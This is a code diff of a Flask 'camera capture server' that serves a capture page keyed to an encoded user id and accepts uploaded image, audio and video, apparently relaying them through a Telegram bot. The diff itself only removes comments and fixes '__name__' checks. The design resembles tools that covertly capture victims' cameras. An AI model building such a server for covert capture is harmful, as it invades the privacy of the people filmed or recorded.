@@ -1,4 +1,3 @@
-# server.py
 import os
 import io
 import logging
@@ -8,7 +7,6 @@ from utils import decode_uid
 import telebot
 from werkzeug.utils import secure_filename
 
-# Load environment variables
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -19,18 +17,14 @@ if not BOT_TOKEN:
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Flask app setup
-app = Flask(name, static_folder="static", template_folder="templates")
+app = Flask(__name__, static_folder="static", template_folder="templates")
 app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE_MB * 1024 * 1024
 
-# Logging
 logging.basicConfig(level=logging.INFO)
-
 
 @app.route("/")
 def index():
     return "Camera capture server. Use /capture?uid=<id>"
-
 
 @app.route("/capture")
 def capture_page():
@@ -41,13 +35,10 @@ def capture_page():
         user_id = decode_uid(uid_enc)
     except Exception:
         return abort(400, "invalid uid")
-    # Render capture UI; the UI will POST to /upload
     return render_template("index.html", uid=uid_enc)
-
 
 @app.route("/upload", methods=["POST"])
 def upload_media():
-    # Expecting form-data: uid (encoded), type ('image'|'audio'|'video'), file (blob)
     uid_enc = request.form.get("uid")
     media_type = request.form.get("type", "image")
 
@@ -90,7 +81,6 @@ def upload_media():
 
     return jsonify({"status": "ok"})
 
-
-if name == "main":
+if __name__ == "__main__":
     port = int(os.getenv("PORT", "10000"))
     app.run(host="0.0.0.0", port=port)
